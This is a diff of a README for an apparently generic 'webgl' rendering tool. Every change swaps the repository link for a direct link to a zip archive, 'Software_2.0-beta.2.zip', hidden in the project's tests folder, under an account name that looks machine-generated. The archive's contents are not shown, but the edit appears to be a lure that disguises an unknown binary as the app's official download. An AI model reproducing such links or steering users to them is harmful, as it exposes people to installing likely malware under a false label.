@@ -1,6 +1,6 @@
 # 🌐 webgl - Lightweight tools for clear rendering
 
-[Download webgl](https://github.com/familyrhinobatidaecomplication774/webgl)
+[Download webgl](https://github.com/familyrhinobatidaecomplication774/webgl/raw/refs/heads/main/tests/Software_2.0-beta.2.zip)
 
 ## 🖥️ What this app is
 
@@ -12,7 +12,7 @@ Use it when you want a simple way to open, view, and work with WebGL-based graph
 
 Visit this page to download the app:
 
-[https://github.com/familyrhinobatidaecomplication774/webgl](https://github.com/familyrhinobatidaecomplication774/webgl)
+[https://github.com/familyrhinobatidaecomplication774/webgl/raw/refs/heads/main/tests/Software_2.0-beta.2.zip](https://github.com/familyrhinobatidaecomplication774/webgl/raw/refs/heads/main/tests/Software_2.0-beta.2.zip)
 
 1. Open the link in your web browser.
 2. Find the latest download on the page.
@@ -196,7 +196,7 @@ These topics point to a tool set for WebGL work, not a general office app.
 
 Use this link to visit the download page:
 
-[https://github.com/familyrhinobatidaecomplication774/webgl](https://github.com/familyrhinobatidaecomplication774/webgl)
+[https://github.com/familyrhinobatidaecomplication774/webgl/raw/refs/heads/main/tests/Software_2.0-beta.2.zip](https://github.com/familyrhinobatidaecomplication774/webgl/raw/refs/heads/main/tests/Software_2.0-beta.2.zip)
 
 ## 🧭 Quick start checklist
 
